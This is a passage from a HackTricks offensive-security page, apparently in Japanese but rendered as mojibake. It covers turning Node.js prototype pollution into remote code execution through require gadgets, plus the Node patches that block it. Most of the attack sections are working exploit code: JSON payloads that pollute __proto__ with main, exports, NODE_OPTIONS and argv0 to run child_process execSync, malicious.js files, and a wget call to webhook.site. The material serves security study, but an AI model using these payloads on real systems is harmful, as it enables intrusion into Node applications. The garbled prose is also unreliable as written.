ã—ã‹ã—ã€ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã®å¾Œã«requireãŒå®Ÿè¡Œã•ã‚Œã‚‹å ´åˆã€ãŸã¨ãˆã‚ãªãŸãŒrequireã•ã‚Œã‚‹ãƒ‘ã‚¹ã‚’**åˆ¶å¾¡ã—ã¦ã„ãªãã¦ã‚‚**ã€ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã‚’æ‚ªç”¨ã—ã¦ç•°ãªã‚‹ãƒ‘ã‚¹ã‚’**å¼·åˆ¶ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™**ã€‚ã—ãŸãŒã£ã¦ã€ã‚³ãƒ¼ãƒ‰è¡ŒãŒ `require("./a_file.js")` ã‚„ `require("bytes")` ã®ã‚ˆã†ã§ã‚ã£ã¦ã‚‚ã€ã‚ãªãŸãŒæ±šæŸ“ã—ãŸãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã‚’**è¦æ±‚ã™ã‚‹ã“ã¨ã«ãªã‚Šã¾ã™**ã€‚

ã—ãŸãŒã£ã¦ã€ã‚ãªãŸã®ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã®å¾Œã«requireãŒå®Ÿè¡Œã•ã‚Œã€spawné–¢æ•°ãŒãªã„å ´åˆã€ã“ã‚ŒãŒæ”»æ’ƒã§ã™ï¼š

* ã‚·ã‚¹ãƒ†ãƒ å†…ã®**`.js` ãƒ•ã‚¡ã‚¤ãƒ«ã‚’è¦‹ã¤ã‘ã‚‹**ã“ã¨ã§ã€**è¦æ±‚ã•ã‚ŒãŸã¨ãã«** `child_process` ã‚’ä½¿ç”¨ã—ã¦ä½•ã‹ã‚’**å®Ÿè¡Œã—ã¾ã™**
* æ”»æ’ƒã—ã¦ã„ã‚‹ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã«ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã§ãã‚‹å ´åˆã¯ã€ãã®ã‚ˆã†ãªãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™
* **`.js` ãƒ•ã‚¡ã‚¤ãƒ«ã®è¦æ±‚ãƒ­ãƒ¼ãƒ‰ã‚’å¼·åˆ¶ã™ã‚‹**ãŸã‚ã«ãƒ‘ã‚¹ã‚’æ±šæŸ“ã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€child\_processã§ä½•ã‹ã‚’å®Ÿè¡Œã—ã¾ã™
* child\_processå®Ÿè¡Œé–¢æ•°ãŒå‘¼ã³å‡ºã•ã‚ŒãŸã¨ãã«ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã€**ç’°å¢ƒ/cmdlineã‚’æ±šæŸ“ã—ã¾ã™**ï¼ˆåˆæœŸã®æŠ€è¡“ã‚’å‚ç…§ï¼‰

#### çµ¶å¯¾require

å®Ÿè¡Œã•ã‚Œã‚‹requireãŒ**çµ¶å¯¾**ï¼ˆ`require("bytes")`ï¼‰ã§ã‚ã‚Šã€**ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã«`package.json` ãƒ•ã‚¡ã‚¤ãƒ«å†…ã«mainãŒå«ã¾ã‚Œã¦ã„ãªã„**å ´åˆã€**`main` å±æ€§ã‚’æ±šæŸ“ã™ã‚‹**ã“ã¨ãŒã§ãã€**ç•°ãªã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ã®å®Ÿè¡Œã‚’è¦æ±‚ã™ã‚‹**ã“ã¨ãŒã§ãã¾ã™ã€‚

{% tabs %}
{% tab title="exploit" %}
{% code overflow="wrap" %}
```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Install package bytes (it doesn't have a main in package.json)
// npm install bytes

// Manual Pollution
b = {}
b.__proto__.main = "/tmp/malicious.js"

// Trigger gadget
var proc = require('bytes');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"main": "/tmp/malicious.js", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_absolute\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('bytes');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```
{% endcode %}
{% endtab %}

{% tab title="malicious.js" %}
```javascript
const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork("anything");
```
{% endtab %}
{% endtabs %}

#### ç›¸å¯¾ãƒ‘ã‚¹ã® require - 1

**ç›¸å¯¾ãƒ‘ã‚¹**ãŒçµ¶å¯¾ãƒ‘ã‚¹ã®ä»£ã‚ã‚Šã«ãƒ­ãƒ¼ãƒ‰ã•ã‚Œã‚‹å ´åˆã€nodeã«**ç•°ãªã‚‹ãƒ‘ã‚¹ã‚’ãƒ­ãƒ¼ãƒ‰**ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

{% tabs %}
{% tab title="exploit" %}
{% code overflow="wrap" %}
```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Manual Pollution
b = {}
b.__proto__.exports = { ".": "./malicious.js" }
b.__proto__["1"] = "/tmp"

// Trigger gadget
var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"exports": {".": "./malicious.js"}, "1": "/tmp", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_exports_1\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```
{% endcode %}
{% endtab %}

{% tab title="malicious.js" %}
```javascript
const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork('/path/to/anything');
```
{% endtab %}
{% endtabs %}

#### ç›¸å¯¾ãƒ‘ã‚¹ã«ã‚ˆã‚‹require - 2

{% tabs %}
{% tab title="ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ" %}
{% code overflow="wrap" %}
```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Manual Pollution
b = {}
b.__proto__.data = {}
b.__proto__.data.exports = { ".": "./malicious.js" }
b.__proto__.path = "/tmp"
b.__proto__.name = "./relative_path.js" //This needs to be the relative path that will be imported in the require

// Trigger gadget
var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"data": {"exports": {".": "./malicious.js"}}, "path": "/tmp", "name": "./relative_path.js", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_exports_path\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```
{% endcode %}
{% endtab %}

{% tab title="malicious.js" %}
```javascript
const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork('/path/to/anything');
```
{% endtab %}
{% endtabs %}

#### Relative require - 3

å‰è¿°ã®ã‚‚ã®ã¨ä¼¼ã¦ã„ã¾ã™ãŒã€[**ã“ã®ãƒ©ã‚¤ãƒˆã‚¢ãƒƒãƒ—**](https://blog.huli.tw/2022/12/26/en/ctf-2022-web-js-summary/#balsn-ctf-2022-2linenodejs)ã§è¦‹ã¤ã‹ã‚Šã¾ã—ãŸã€‚
```javascript
// Requiring /opt/yarn-v1.22.19/preinstall.js
Object.prototype["data"] = {
exports: {
".": "./preinstall.js"
},
name: './usage'
}
Object.prototype["path"] = '/opt/yarn-v1.22.19'
Object.prototype.shell = "node"
Object.prototype["npm_config_global"] = 1
Object.prototype.env = {
"NODE_DEBUG": "console.log(require('child_process').execSync('wget${IFS}https://webhook.site?q=2').toString());process.exit()//",
"NODE_OPTIONS": "--require=/proc/self/environ"
}

require('./usage.js')
```
## VM Gadgets

è«–æ–‡ [https://arxiv.org/pdf/2207.11171.pdf](https://arxiv.org/pdf/2207.11171.pdf) ã«ã‚‚ã€**`vm`** ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã®ã„ãã¤ã‹ã®ãƒ¡ã‚½ãƒƒãƒ‰ã® **`contextExtensions`** ã®åˆ¶å¾¡ãŒã‚¬ã‚¸ã‚§ãƒƒãƒˆã¨ã—ã¦ä½¿ç”¨ã§ãã‚‹ã“ã¨ãŒç¤ºã•ã‚Œã¦ã„ã¾ã™ã€‚\
ã—ã‹ã—ã€å‰è¿°ã® **`child_process`** ãƒ¡ã‚½ãƒƒãƒ‰ã¨åŒæ§˜ã«ã€æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã§ã¯ **ä¿®æ­£** ã•ã‚Œã¦ã„ã¾ã™ã€‚

## ä¿®æ­£ & æ„å¤–ãªä¿è­·

ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã¯ã€ã‚¢ã‚¯ã‚»ã‚¹ã•ã‚Œã¦ã„ã‚‹ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã® **å±æ€§** ãŒ **æœªå®šç¾©** ã®å ´åˆã«æ©Ÿèƒ½ã™ã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚ã‚‚ã— **ã‚³ãƒ¼ãƒ‰** ã§ãã® **å±æ€§** ã« **å€¤** ãŒ **è¨­å®š** ã•ã‚Œã¦ã„ã‚‹å ´åˆã€ãã‚Œã‚’ä¸Šæ›¸ãã™ã‚‹ã“ã¨ã¯ **ã§ãã¾ã›ã‚“**ã€‚

2022å¹´6æœˆã« [**ã“ã®ã‚³ãƒŸãƒƒãƒˆ**](https://github.com/nodejs/node/commit/20b0df1d1eba957ea30ba618528debbe02a97c6a) ã‹ã‚‰ã€å¤‰æ•° `options` ã¯ `{}` ã®ä»£ã‚ã‚Šã« **`kEmptyObject`** ã«ãªã‚Šã¾ã—ãŸã€‚ã“ã‚Œã«ã‚ˆã‚Šã€**`options`** ã® **å±æ€§** ã«å½±éŸ¿ã‚’ä¸ãˆã‚‹ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã‚’ **é˜²ã** ã“ã¨ãŒã§ãã€RCEã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã›ã‚“ã€‚\
å°‘ãªãã¨ã‚‚ v18.4.0 ã‹ã‚‰ã“ã®ä¿è­·ãŒ **å®Ÿè£…** ã•ã‚Œã€ãã®ãŸã‚ `spawn` ã¨ `spawnSync` ã® **ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ** ã¯ï¼ˆ`options` ãŒä½¿ç”¨ã•ã‚Œã¦ã„ãªã„å ´åˆï¼‰ã‚‚ã† **æ©Ÿèƒ½ã—ã¾ã›ã‚“**ã€‚

[**ã“ã®ã‚³ãƒŸãƒƒãƒˆ**](https://github.com/nodejs/node/commit/0313102aaabb49f78156cadc1b3492eac3941dd9) ã§ã¯ã€vm ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã® **`contextExtensions`** ã® **ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“** ã‚‚ **`{}`** ã®ä»£ã‚ã‚Šã« **`kEmptyObject`** ã‚’è¨­å®šã™ã‚‹ã“ã¨ã§ **ã‚ã‚‹ç¨®ã®ä¿®æ­£** ãŒè¡Œã‚ã‚Œã¾ã—ãŸã€‚

### **ãã®ä»–ã®ã‚¬ã‚¸ã‚§ãƒƒãƒˆ**

* [https://github.com/yuske/server-side-prototype-pollution](https://github.com/yuske/server-side-prototype-pollution)

## å‚è€ƒæ–‡çŒ®

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://blog.sonarsource.com/blitzjs-prototype-pollution/](https://blog.sonarsource.com/blitzjs-prototype-pollution/)
* [https://arxiv.org/pdf/2207.11171.pdf](https://arxiv.org/pdf/2207.11171.pdf)
* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) ã§ AWS ãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶</strong></summary>

HackTricks ã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricks ã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯ **HackTricks ã‚’ PDF ã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„** å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop) ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼ PEASS & HackTricks ã‚°ãƒƒã‚º**](https://peass.creator-spring.com) ã‚’å…¥æ‰‹ã—ã¦ãã ã•ã„ã€‚
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª [**NFTs**](https://opensea.io/collection/the-peass-family) ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ã€‚
* ğŸ’¬ [**Discord ã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f) ã¾ãŸã¯ [**telegram ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass) ã« **å‚åŠ ã™ã‚‹** ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm) ã‚’ **ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„**ã€‚
* **HackTricks** ã® [**GitHub ãƒªãƒã‚¸ãƒˆãƒª**](https://github.com/carlospolop/hacktricks) ã¨ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ã« PR ã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’ **å…±æœ‰ã—ã¦ãã ã•ã„**ã€‚

</details>
